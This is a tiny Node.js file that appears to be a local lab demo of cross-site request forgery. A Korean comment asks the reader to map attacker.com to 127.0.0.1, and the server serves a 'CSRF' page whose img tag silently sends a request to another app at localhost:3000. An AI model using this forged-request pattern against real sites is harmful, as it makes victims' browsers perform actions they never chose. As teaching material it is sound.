/**
 * 127.0.0.1 attacker.com 레코드를 추가하세요
 */

const http = require("http");

function index(req, res) {
  res.writeHead(200, {
    "Content-Type": "text/html",
  });

  res.end(`
    <!DOCTYPE html>
    <html>
      <head></head>
      <body>
        CSRF
        <img src="http://localhost:3000" />
      </body>
    </html>
  `);
}

const server = http.createServer((req, res) => {
  index(req, res);
});

server.listen(3002, () => {
  console.log("server is running ::3002");
});
